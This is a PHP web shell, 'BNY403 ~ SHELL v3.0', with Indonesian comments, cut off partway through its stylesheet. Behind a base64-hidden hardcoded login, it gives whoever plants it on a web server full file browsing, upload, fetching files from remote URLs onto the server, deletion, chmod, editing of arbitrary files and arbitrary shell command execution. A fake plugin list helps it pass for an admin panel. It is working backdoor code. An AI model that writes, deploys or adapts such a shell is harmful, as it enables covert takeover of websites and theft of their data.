<?php
// =============================================
// BNY403 ~ SHELL - Integrated Web Shell v3.0
// =============================================

error_reporting(E_ALL);
ini_set('display_errors', 1);

// =============================================
// LOGIN CONFIGURATION
// =============================================

// Username dan Password dalam Base64
// Default: admin / admin123
define('USERNAME_B64', 'YWRtaW4='); // admin
define('PASSWORD_B64', 'Ym55NDAz'); //

// =============================================
// SESSION & AUTHENTICATION
// =============================================

session_start();

// Cek login
$isLoggedIn = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

// Proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $valid_username = base64_decode(USERNAME_B64);
    $valid_password = base64_decode(PASSWORD_B64);
    
    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['login_time'] = time();
        $isLoggedIn = true;
        // Refresh halaman
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $loginError = 'Invalid username or password!';
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// =============================================
// FUNCTIONS
// =============================================

function getIPInfo($ip) {
    if ($ip == '::1' || $ip == '127.0.0.1') {
        return ['countryCode' => 'ID', 'country' => 'Indonesia', 'flag' => '🇮🇩'];
    }
    $url = "http://ip-api.com/json/{$ip}";
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response) {
            $data = json_decode($response, true);
            if ($data && $data['status'] == 'success') {
                return $data;
            }
        }
    }
    return ['countryCode' => 'ID', 'country' => 'Indonesia', 'flag' => '🇮🇩'];
}

function getCountryFlag($countryCode) {
    if (empty($countryCode)) return '🏳️';
    $code = strtoupper($countryCode);
    $flag = '';
    for ($i = 0; $i < strlen($code); $i++) {
        $flag .= mb_chr(127397 + ord($code[$i]));
    }
    return $flag;
}

function formatSize($bytes) {
    if ($bytes === 0) return '0 B';
    $k = 1024;
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}

function getFilePermissions($path) {
    if (!file_exists($path)) return '---------';
    $perms = fileperms($path);
    $info = '';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

function getDirectoryContents($path) {
    $items = [];
    if (!is_dir($path)) return $items;
    
    if ($handle = opendir($path)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != '.' && $entry != '..') {
                $fullPath = $path . '/' . $entry;
                $items[] = [
                    'name' => $entry,
                    'path' => $fullPath,
                    'is_dir' => is_dir($fullPath),
                    'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                    'perms' => getFilePermissions($fullPath),
                    'mtime' => date('Y-m-d H:i:s', filemtime($fullPath)),
                    'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($fullPath))['name'] : fileowner($fullPath),
                    'group' => function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($fullPath))['name'] : filegroup($fullPath)
                ];
            }
        }
        closedir($handle);
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

// Plugin data
function getPlugins() {
    return [
        ['name' => 'Security Pro', 'version' => 'v3.2.1', 'status' => 'Active'],
        ['name' => 'Speed Optimizer', 'version' => 'v2.5.0', 'status' => 'Active'],
        ['name' => 'SEO Master', 'version' => 'v1.8.3', 'status' => 'Inactive'],
        ['name' => 'DB Backup', 'version' => 'v4.1.0', 'status' => 'Pending'],
        ['name' => 'Cache Manager', 'version' => 'v2.0.1', 'status' => 'Active'],
        ['name' => 'Firewall Pro', 'version' => 'v3.0.0', 'status' => 'Inactive'],
        ['name' => 'Analytics Tool', 'version' => 'v1.5.2', 'status' => 'Active'],
    ];
}

// =============================================
// HANDLE ACTIONS (hanya jika login)
// =============================================

if ($isLoggedIn) {
    $currentPath = isset($_GET['path']) && !empty($_GET['path']) ? $_GET['path'] : getcwd();
    $currentPath = realpath($currentPath) ?: getcwd();
    $message = '';
    $messageType = 'success';

    // Create Folder
    if (isset($_POST['create_folder'])) {
        $folderName = trim($_POST['folder_name']);
        if (!empty($folderName)) {
            $newPath = $currentPath . '/' . $folderName;
            if (!file_exists($newPath)) {
                if (mkdir($newPath, 0755, true)) {
                    $message = "Folder '{$folderName}' created successfully!";
                    $messageType = 'success';
                } else {
                    $message = "Failed to create folder!";
                    $messageType = 'error';
                }
            } else {
                $message = "Folder already exists!";
                $messageType = 'error';
            }
        }
    }

    // Create File
    if (isset($_POST['create_file'])) {
        $fileName = trim($_POST['file_name']);
        if (!empty($fileName)) {
            $newPath = $currentPath . '/' . $fileName;
            if (!file_exists($newPath)) {
                if (file_put_contents($newPath, '') !== false) {
                    $message = "File '{$fileName}' created successfully!";
                    $messageType = 'success';
                } else {
                    $message = "Failed to create file!";
                    $messageType = 'error';
                }
            } else {
                $message = "File already exists!";
                $messageType = 'error';
            }
        }
    }

    // Upload File
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
        $targetFile = $currentPath . '/' . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetFile)) {
            $message = "File uploaded successfully!";
            $messageType = 'success';
        } else {
            $message = "Failed to upload file!";
            $messageType = 'error';
        }
    }

    // Remote Upload
    if (isset($_POST['remote_upload'])) {
        $url = trim($_POST['remote_url']);
        $filename = trim($_POST['remote_filename']);
        if (!empty($url)) {
            $content = @file_get_contents($url);
            if ($content !== false) {
                if (empty($filename)) {
                    $filename = basename($url);
                }
                $targetFile = $currentPath . '/' . $filename;
                if (file_put_contents($targetFile, $content) !== false) {
                    $message = "Remote file downloaded successfully!";
                    $messageType = 'success';
                } else {
                    $message = "Failed to save remote file!";
                    $messageType = 'error';
                }
            } else {
                $message = "Failed to download remote file!";
                $messageType = 'error';
            }
        }
    }

    // Delete
    if (isset($_GET['delete']) && !empty($_GET['delete'])) {
        $target = $_GET['delete'];
        if (file_exists($target)) {
            if (is_dir($target)) {
                if (deleteDirectory($target)) {
                    $message = "Folder deleted successfully!";
                    $messageType = 'success';
                } else {
                    $message = "Failed to delete folder!";
                    $messageType = 'error';
                }
            } else {
                if (unlink($target)) {
                    $message = "File deleted successfully!";
                    $messageType = 'success';
                } else {
                    $message = "Failed to delete file!";
                    $messageType = 'error';
                }
            }
        } else {
            $message = "File/Folder not found!";
            $messageType = 'error';
        }
        header("Location: ?path=" . urlencode($currentPath));
        exit;
    }

    // Rename
    if (isset($_POST['rename'])) {
        $oldName = $_POST['old_name'];
        $newName = trim($_POST['new_name']);
        if (!empty($newName) && file_exists($oldName)) {
            $newPath = dirname($oldName) . '/' . $newName;
            if (!file_exists($newPath)) {
                if (rename($oldName, $newPath)) {
                    $message = "Renamed successfully!";
                    $messageType = 'success';
                } else {
                    $message = "Failed to rename!";
                    $messageType = 'error';
                }
            } else {
                $message = "Name already exists!";
                $messageType = 'error';
            }
        }
    }

    // Chmod
    if (isset($_POST['chmod'])) {
        $target = $_POST['chmod_target'];
        $perms = octdec($_POST['chmod_perms']);
        if (file_exists($target)) {
            if (chmod($target, $perms)) {
                $message = "Permissions changed successfully!";
                $messageType = 'success';
            } else {
                $message = "Failed to change permissions!";
                $messageType = 'error';
            }
        }
    }

    // Edit/Save File
    if (isset($_POST['save_file'])) {
        $filePath = $_POST['file_path'];
        $content = $_POST['file_content'];
        if (!empty($filePath) && file_exists($filePath)) {
            if (file_put_contents($filePath, $content) !== false) {
                $message = "File saved successfully!";
                $messageType = 'success';
            } else {
                $message = "Failed to save file!";
                $messageType = 'error';
            }
        } else {
            $message = "File not found!";
            $messageType = 'error';
        }
    }

    // View & Edit File
    $viewFile = isset($_GET['view']) ? $_GET['view'] : null;
    $editFile = isset($_GET['edit']) ? $_GET['edit'] : null;
    $fileContent = '';
    $filePath = '';

    if ($viewFile && file_exists($viewFile) && is_file($viewFile)) {
        $fileContent = file_get_contents($viewFile);
        $filePath = $viewFile;
    }
    if ($editFile && file_exists($editFile) && is_file($editFile)) {
        $fileContent = file_get_contents($editFile);
        $filePath = $editFile;
    }

    // Download
    if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (file_exists($file) && is_file($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            readfile($file);
            exit;
        }
    }

    // Execute Command
    $commandOutput = '';
    if (isset($_POST['execute_cmd'])) {
        $cmd = trim($_POST['cmd']);
        if (!empty($cmd)) {
            if (function_exists('shell_exec')) {
                $disabled = explode(',', ini_get('disable_functions'));
                if (!in_array('shell_exec', $disabled)) {
                    $cmd = escapeshellcmd($cmd);
                    $commandOutput = shell_exec($cmd . ' 2>&1');
                    if ($commandOutput === null || $commandOutput === false) {
                        $commandOutput = 'Command execution returned no output';
                    } elseif (empty($commandOutput)) {
                        $commandOutput = 'Command executed successfully (no output)';
                    }
                } else {
                    $commandOutput = 'ERROR: shell_exec() is disabled in php.ini';
                }
            } else {
                if (function_exists('exec')) {
                    $disabled = explode(',', ini_get('disable_functions'));
                    if (!in_array('exec', $disabled)) {
                        $cmd = escapeshellcmd($cmd);
                        exec($cmd . ' 2>&1', $output, $returnCode);
                        $commandOutput = implode("\n", $output);
                        if (empty($commandOutput)) {
                            $commandOutput = 'Command executed (return code: ' . $returnCode . ')';
                        }
                    } else {
                        $commandOutput = 'ERROR: exec() is disabled in php.ini';
                    }
                } else {
                    $commandOutput = 'ERROR: No command execution function available';
                }
            }
        }
    }
}

// =============================================
// GET DATA (hanya jika login)
// =============================================

if ($isLoggedIn) {
    $serverIP = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? '127.0.0.1';
    $yourIP = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    $serverIPInfo = getIPInfo($serverIP);
    $yourIPInfo = getIPInfo($yourIP);

    $items = getDirectoryContents($currentPath);
    $plugins = getPlugins();

    // Build breadcrumb
    $pathParts = explode('/', $currentPath);
    $buildPath = '';
    $breadcrumbs = [];
    foreach ($pathParts as $part) {
        if (empty($part)) continue;
        $buildPath .= '/' . $part;
        $breadcrumbs[] = ['name' => $part, 'path' => $buildPath];
    }

    // AJAX handler untuk view file
    if (isset($_GET['ajax_view']) && !empty($_GET['ajax_view'])) {
        $file = $_GET['ajax_view'];
        if (file_exists($file) && is_file($file)) {
            $content = file_get_contents($file);
            echo htmlspecialchars($content);
        } else {
            echo 'File not found or is not readable';
        }
        exit;
    }
}

// =============================================
// HTML OUTPUT
// =============================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $isLoggedIn ? 'BNY403 ~ SHELL' : 'BNY403 ~ SHELL - Login' ?></title>
    <link rel="icon" href="https://i.ibb.co/mCZkXzZh/bny.jpg" type="image/jpeg">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* ===== THEMES ===== */
        :root {
            --bg-image: url('https://i.ibb.co/mCZkXzZh/bny.jpg');
            --glass-bg: rgba(255, 255, 255, 0.06);
            --glass-border: rgba(255, 255, 255, 0.08);
            --text-primary: #ffffff;
            --text-secondary: rgba(255, 255, 255, 0.7);
            --text-muted: rgba(255, 255, 255, 0.35);
            --accent: #00ff66;
            --accent-bg: rgba(0, 255, 100, 0.10);
            --accent-border: rgba(0, 255, 100, 0.15);
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            --overlay: rgba(0, 0, 0, 0.4);
        }

        /* Light Theme - Transparan */
        [data-theme="light"] {
            --glass-bg: rgba(255, 255, 255, 0.10);
            --glass-border: rgba(255, 255, 255, 0.12);
            --text-primary: #ffffff;
            --text-secondary: rgba(255, 255, 255, 0.8);
            --text-muted: rgba(255, 255, 255, 0.4);
            --accent: #00ff66;
            --accent-bg: rgba(0, 255, 100, 0.12);
            --accent-border: rgba(0, 255, 100, 0.18);
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            --overlay: rgba(0, 0, 0, 0.2);
        }

        /* Green Theme */
        [data-theme="green"] {
            --glass-bg: rgba(0, 40, 15, 0.50);
            --glass-border: rgba(0, 255, 100, 0.15);
            --text-primary: #00ff66;
            --text-secondary: rgba(0, 255, 100, 0.7);
            --text-muted: rgba(0, 255, 100, 0.35);
            --accent: #00ff66;
            --accent-bg: rgba(0, 255, 100, 0.12);
            --accent-border: rgba(0, 255, 100, 0.20);
            --shadow: 0 8px 32px rgba(0, 255, 100, 0.05);
            --overlay: rgba(0, 30, 10, 0.5);
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            background: var(--bg-image) no-repeat center center fixed;
            background-size: cover;
            padding: 16px;
            position: relative;
            color: var(--text-primary);
            transition: all 0.3s ease;
            display: <?= $isLoggedIn ? 'block' : 'flex' ?>;
            justify-content: center;
            align-items: center;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--overlay);
            z-index: 0;
        }

        .container {
            max-width: 1440px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
            width: 100%;
        }

        /* ============================================
           LOGIN PAGE STYLES
           ============================================ */
        .login-container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
        }

        .login-card {
            background: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(0, 255, 100, 0.15);
            border-radius: 20px;
            padding: 40px 35px;
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.6s ease;
        }

        @keyframes slideUp {
            from {
                transform: translateY(30px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .login-logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-logo .logo-icon {
            width: 70px;
            height: 70px;
            border-radius: 16px;
            background: url('https://i.ibb.co/mCZkXzZh/bny.jpg') center center;
            background-size: cover;
            border: 2px solid rgba(0, 255, 100, 0.2);
            margin: 0 auto 12px;
            box-shadow: 0 0 40px rgba(0, 255, 100, 0.05);
        }

        .login-logo h1 {
            font-size: 28px;
            font-weight: 700;
            color: #00ff66;
            text-shadow: 0 0 40px rgba(0, 255, 100, 0.1);
            letter-spacing: 1px;
        }

        .login-logo h1 span {
            color: #ffffff;
            font-weight: 300;
        }

        .login-logo .subtitle {
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-top: 4px;
        }

        .login-form .form-group {
            margin-bottom: 18px;
        }

        .login-form .form-group label {
            display: block;
            color: rgba(255, 255, 255, 0.4);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 6px;
            font-weight: 500;
        }

        .login-form .form-group .input-wrapper {
            position: relative;
        }

        .login-form .form-group .input-wrapper .input-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            opacity: 0.3;
        }

        .login-form .form-group input {
            width: 100%;
            padding: 12px 16px 12px 44px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            color: #ffffff;
            font-size: 14px;
            transition: all 0.3s ease;
            outline: none;
        }

        .login-form .form-group input:focus {
            border-color: rgba(0, 255, 100, 0.3);
            background: rgba(255, 255, 255, 0.06);
            box-shadow: 0 0 0 4px rgba(0, 255, 100, 0.04);
        }

        .login-form .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.2);
            font-size: 13px;
        }

        .login-btn {
            width: 100%;
            padding: 13px;
            background: rgba(0, 255, 100, 0.12);
            border: 1px solid rgba(0, 255, 100, 0.2);
            border-radius: 12px;
            color: #00ff66;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 6px;
            letter-spacing: 0.5px;
        }

        .login-btn:hover {
            background: rgba(0, 255, 100, 0.2);
            border-color: rgba(0, 255, 100, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(0, 255, 100, 0.08);
        }

        .login-error {
            background: rgba(255, 50, 50, 0.08);
            border: 1px solid rgba(255, 50, 50, 0.15);
            border-radius: 10px;
            padding: 10px 14px;
            color: #ff6b6b;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 18px;
            animation: shake 0.4s ease;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-4px); }
            80% { transform: translateX(4px); }
        }

        .login-footer {
            text-align: center;
            margin-top: 24px;
            color: rgba(255, 255, 255, 0.15);
            font-size: 11px;
            letter-spacing: 0.5px;
        }

        .login-card .deco-line {
            width: 40px;
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 100, 0.2));
            margin: 0 auto 18px;
            border-radius: 2px;
        }

        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.2);
            cursor: pointer;
            font-size: 16px;
            transition: color 0.3s ease;
            padding: 4px;
        }

        .toggle-password:hover {
            color: rgba(255, 255, 255, 0.4);
        }

        /* ============================================
           SHELL PAGE STYLES
           ============================================ */
        .glass {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            box-shadow: var(--shadow);
        }

        .header {
            padding: 18px 24px;
            border-radius: 14px;
            margin-bottom: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--accent-border);
            box-shadow: var(--shadow);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .header-left .logo-icon {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            background: url('https://i.ibb.co/mCZkXzZh/bny.jpg') center center;
            background-size: cover;
            border: 2px solid var(--accent-border);
        }

        .header-left .logo {
            font-size: 22px;
            font-weight: 700;
            color: var(--accent);
            text-shadow: 0 0 30px rgba(0, 255, 100, 0.15);
        }

        .header-left .logo span {
            color: var(--text-primary);
            font-weight: 300;
        }

        .header-left .version {
            font-size: 10px;
            color: var(--accent);
            background: var(--accent-bg);
            padding: 2px 10px;
            border-radius: 20px;
            border: 1px solid var(--accent-border);
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .header-right .datetime {
            color: var(--text-secondary);
            font-size: 12px;
            padding: 5px 12px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            border: 1px solid var(--glass-border);
            font-weight: 500;
        }

        .theme-selector {
            display: flex;
            gap: 4px;
            background: rgba(0, 0, 0, 0.2);
            padding: 4px;
            border-radius: 8px;
            border: 1px solid var(--glass-border);
        }

        .theme-btn {
            padding: 4px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.3s ease;
            background: transparent;
            color: var(--text-muted);
        }

        .theme-btn:hover {
            background: var(--accent-bg);
            color: var(--accent);
        }

        .theme-btn.active {
            background: var(--accent);
            color: #fff;
        }

        .logout-btn {
            background: rgba(255, 50, 50, 0.1);
            border: 1px solid rgba(255, 50, 50, 0.15);
            color: #ff6b6b;
            padding: 5px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.3s ease;
            text-decoration: none;
        }

        .logout-btn:hover {
            background: rgba(255, 50, 50, 0.2);
            border-color: rgba(255, 50, 50, 0.3);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
            gap: 10px;
            margin-bottom: 16px;
        }

        .stat-card {
            padding: 12px 14px;
            border-radius: 10px;
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            text-align: center;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            border-color: var(--accent-border);
        }

        .stat-card .number {
            font-size: 22px;
            font-weight: 700;
            color: var(--accent);
            text-shadow: 0 0 30px rgba(0, 255, 100, 0.08);
        }

        .stat-card .label {
            font-size: 9px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 3px;
        }

        .stat-card .icon {
            font-size: 16px;
            margin-bottom: 3px;
        }

        .info-bar {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            padding: 10px 18px;
            border-radius: 10px;
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            margin-bottom: 16px;
            align-items: center;
        }

        .info-bar .info-item {
            display: flex;
            align-items: center;
            gap: 6px;
            color: var(--text-secondary);
            font-size: 12px;
        }

        .info-bar .info-item .label {
            color: var(--text-muted);
            font-size: 9px;
            text-transform: uppercase;
        }

        .info-bar .info-item .value {
            color: var(--accent);
            font-weight: 500;
        }

        .info-bar .info-item .flag {
            font-size: 20px;
        }

        .info-bar .info-item .badge {
            background: var(--accent-bg);
            color: var(--accent);
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 10px;
            border: 1px solid var(--accent-border);
        }

        .path-breadcrumb {
            padding: 10px 18px;
            border-radius: 10px;
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 5px;
        }

        .path-breadcrumb .label {
            font-size: 9px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-right: 4px;
        }

        .path-breadcrumb .crumb {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 10px;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--glass-border);
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .path-breadcrumb .crumb:hover {
            background: var(--accent-bg);
            border-color: var(--accent-border);
            color: var(--accent);
        }

        .path-breadcrumb .crumb.active {
            background: var(--accent-bg);
            border-color: var(--accent-border);
            color: var(--accent);
            cursor: default;
        }

        .path-breadcrumb .crumb-root {
            background: var(--accent-bg);
            border-color: var(--accent-border);
            color: var(--accent);
        }

        .path-breadcrumb .crumb-count {
            margin-left: auto;
            font-size: 10px;
            color: var(--text-muted);
            padding: 3px 10px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 5px;
        }

        .tools-bar {
            padding: 14px 18px;
            border-radius: 10px;
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            margin-bottom: 16px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            align-items: center;
        }

        .tools-bar .tool-group {
            display: flex;
            gap: 6px;
            align-items: center;
            flex-wrap: wrap;
        }

        .tools-bar .tool-group label {
            font-size: 10px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.3px;
            min-width: 50px;
        }

        .tools-bar input[type="text"],
        .tools-bar input[type="file"] {
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid var(--glass-border);
            color: var(--text-primary);
            padding: 6px 10px;
            border-radius: 6px;
            font-size: 12px;
            min-width: 100px;
            transition: all 0.3s ease;
            flex: 1;
        }

        .tools-bar input[type="text"]:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 255, 100, 0.04);
        }

        .tools-bar input::placeholder {
            color: var(--text-muted);
            font-size: 11px;
        }

        .tools-bar .btn {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--glass-border);
            color: var(--text-secondary);
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            white-space: nowrap;
        }

        .tools-bar .btn:hover {
            background: var(--accent-bg);
            border-color: var(--accent-border);
            color: var(--accent);
            transform: translateY(-1px);
        }

        .tools-bar .btn-success {
            background: var(--accent-bg);
            border-color: var(--accent-border);
            color: var(--accent);
        }

        .tools-bar .btn-info {
            background: rgba(0, 150, 255, 0.08);
            border-color: rgba(0, 150, 255, 0.12);
            color: #66b3ff;
        }

        .tools-bar .btn-info:hover {
            background: rgba(0, 150, 255, 0.15);
        }

        .tools-bar .btn-upload {
            background: rgba(255, 200, 0, 0.08);
            border-color: rgba(255, 200, 0, 0.12);
            color: #ffd93d;
        }

        .tools-bar .btn-upload:hover {
            background: rgba(255, 200, 0, 0.15);
        }

        .table-wrapper {
            border-radius: 10px;
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            overflow: hidden;
            margin-bottom: 16px;
        }

        .table-header {
            padding: 12px 18px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--glass-border);
            cursor: pointer;
            user-select: none;
            transition: all 0.3s ease;
        }

        .table-header:hover {
            background: var(--accent-bg);
        }

        .table-header h3 {
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-primary);
        }

        .table-header .badge {
            background: var(--accent-bg);
            color: var(--accent);
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 10px;
            border: 1px solid var(--accent-border);
        }

        .table-header .arrow {
            transition: all 0.3s ease;
            font-size: 16px;
            color: var(--text-muted);
        }

        .table-header .arrow.collapsed {
            transform: rotate(-90deg);
        }

        .table-body {
            overflow-x: auto;
            transition: all 0.3s ease;
            max-height: 500px;
            overflow-y: auto;
        }

        .table-body.collapsed {
            max-height: 0 !important;
            overflow: hidden;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }

        table thead {
            background: rgba(0, 0, 0, 0.2);
            position: sticky;
            top: 0;
            z-index: 10;
        }

        table th {
            text-align: left;
            padding: 8px 12px;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 9px;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            border-bottom: 1px solid var(--glass-border);
        }

        table td {
            padding: 6px 12px;
            border-bottom: 1px solid var(--glass-border);
            vertical-align: middle;
            color: var(--text-secondary);
        }

        table tbody tr {
            transition: all 0.3s ease;
        }

        table tbody tr:hover {
            background: var(--accent-bg);
        }

        .file-icon {
            font-size: 14px;
            margin-right: 5px;
        }

        .file-name {
            display: flex;
            align-items: center;
            font-weight: 500;
        }

        .file-name .name-text {
            word-break: break-word;
            color: var(--text-primary);
        }

        .dir-link {
            color: var(--text-primary);
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .dir-link:hover {
            color: var(--accent);
        }

        .perms {
            font-family: 'Courier New', monospace;
            font-size: 10px;
            color: var(--text-muted);
        }

        .action-buttons {
            display: flex;
            gap: 3px;
            flex-wrap: wrap;
        }

        .action-buttons .btn-sm {
            padding: 2px 7px;
            font-size: 9px;
            border-radius: 4px;
            border: 1px solid var(--glass-border);
            background: rgba(255, 255, 255, 0.02);
            color: var(--text-muted);
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 2px;
        }

        .action-buttons .btn-sm:hover {
            background: var(--accent-bg);
            border-color: var(--accent-border);
            color: var(--accent);
        }

        .action-buttons .btn-sm.danger:hover {
            background: rgba(255, 50, 50, 0.12);
            border-color: rgba(255, 50, 50, 0.2);
            color: #ff4444;
        }

        .action-buttons .btn-sm.success:hover {
            background: var(--accent-bg);
            border-color: var(--accent-border);
            color: var(--accent);
        }

        .plugins-wrapper {
            border-radius: 10px;
            background: var(--glass-bg);
            backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            overflow: hidden;
            margin-bottom: 16px;
        }

        .plugins-header {
            padding: 12px 18px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--glass-border);
            cursor: pointer;
            user-select: none;
            transition: all 0.3s ease;
        }

        .plugins-header:hover {
            background: var(--accent-bg);
        }

        .plugins-header h3 {
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
